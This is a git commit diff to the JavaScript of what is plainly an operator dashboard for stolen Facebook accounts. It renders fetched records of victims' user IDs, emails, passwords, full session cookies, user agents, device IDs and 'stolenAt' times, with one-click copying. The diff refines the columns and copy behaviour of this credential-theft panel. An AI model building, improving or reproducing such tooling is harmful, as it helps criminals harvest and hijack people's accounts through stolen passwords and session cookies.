f50064a9935913cc6898e85d5df79eb61332a337
datadestroyed <155633910+datadestroyed@users.noreply.github.com>
2024-01-05 18:20:05 +0700

    Add files via upload

--- script.js
+++ script.js
@@ -8,7 +8,7 @@ function validateText(text, isNumber = false) {
     return false;
 }
 
-function fillDataToTable() {
+function fillDataToTable(isHideSwal) {
     fetch(API)
         .then((res) => res.json())
         .then((data) => {
@@ -16,10 +16,13 @@ function fillDataToTable() {
                 .map((user, index) => {
                     const shortCookie = user.cookie.split(";")[0].split("=")[1];
                     return `<tr scope="row">
-                    <td><a class="text-white text-decoration-none fw-bold" target="_blank"  href='${
-                        validateText(user.c_user) ? "https://fb.com/" + user.c_user : "#"
-                    }'>${index + 1}</a></td>
-                    ${["c_user", "email", "password", "device_id"]
+                                <td>
+                                    <a class="text-white text-decoration-none fw-bold" target="_blank"  href='${
+                                        validateText(user.c_user) ? "https://fb.com/" + user.c_user : "#"
+                                    }'>${index + 1}</a>
+                                </td>
+
+                    ${["c_user", "email", "password"]
                         .map(
                             (field) => `
                         <td title="${user[field]}" data-bs-coppy="${user[field]}" style='color: ${
@@ -28,10 +31,16 @@ function fillDataToTable() {
                     `
                         )
                         .join("")}
+
                     <td data-bs-coppy="${user.cookie}" class="short-view" style='color: ${
                         shortCookie || "red !important"
                     }' title="${user.cookie}">${shortCookie || "unknown"}</td>
+
                     <td data-bs-coppy="${user.userAgent}" class="short-view" title="${user.userAgent}">Coppy</td>
+                    <td data-bs-coppy="${user.device_id}" class="short-view" style='color: ${
+                        validateText(user.device_id) ? "" : "red !important"
+                    }' title="${validateText(user.device_id)}">${validateText(user.device_id, true) || "unknown"}</td>
+
                     <td title="${user.stolenAt}" data-bs-coppy="${user.stolenAt}">${user.stolenAt}</td>
                     <td><button data-bs-toggle="modal" data-bs-target="#show-options-modal" class="menu-more btn btn-secondary" style="padding: 6px 20px;border-radius: 12px; background: #ffffff11; color: white" data-bs-id="${
                         user.id
@@ -43,15 +52,11 @@ function fillDataToTable() {
         })
         .then(() => {
             document.querySelectorAll("td[data-bs-coppy]").forEach((td) => {
-                 Swal.fire({
-                    title: "Success!",
-                    text: "Data updated!",
-                    icon: "success",
-                    confirmButtonText: "Close",
-                });
                 td.onclick = () => {
                     const text = td.getAttribute("data-bs-coppy");
-                    if (text && text !== "" && text !== "unknown") {
+                    const textInner = td.innerText;
+
+                    if (textInner != "unknown") {
                         navigator.clipboard.writeText(text);
                         Swal.fire({
                             title: "Success!",
@@ -69,7 +74,17 @@ function fillDataToTable() {
                     }
                 };
             });
+        })
+        .finally(() => {
+            !isHideSwal
+                ? Swal.fire({
+                      title: "Success!",
+                      text: "Data updated!",
+                      icon: "success",
+                      confirmButtonText: "Close",
+                  })
+                : null;
         });
 }
 
-(() => fillDataToTable())();
+(() => fillDataToTable(true))();
